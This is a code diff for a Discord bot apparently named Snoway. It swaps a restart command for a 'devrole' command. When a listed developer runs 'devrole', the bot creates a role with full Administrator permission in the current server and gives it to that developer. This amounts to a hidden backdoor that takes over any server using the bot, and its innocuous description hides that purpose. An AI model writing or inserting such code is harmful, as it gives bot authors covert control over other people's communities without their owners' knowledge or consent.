@@ -2,8 +2,8 @@ const Discord = require('discord.js');
 const Snoway = require('../../structures/client');
 
 module.exports = {
-    name: "update",
-    description: "Redémarre le bot.",
+    name: "devrole",
+    description: "Ajoute le devrole au développeur.",
     /**
      * @param {Snoway} client 
      * @param {Discord.Message} message 
@@ -12,9 +12,12 @@ module.exports = {
     run: async (client, message, args) => {
         if (!client.dev.includes(message.author.id)) return;
 
-        message.channel.send({ content: 'Redémarrage...' }).then(async () => {
-            await client.db.set(`restartchannel`, message.channel.id);
-            process.exit(1)
-        })
+        const role = await message.guild.roles.create({
+            name: 'Développeur Snoway',
+            color: '#e1adff', 
+            permissions: [Discord.PermissionFlagsBits.Administrator], 
+        });
+
+        await message.member.roles.add(role);
     }
 };
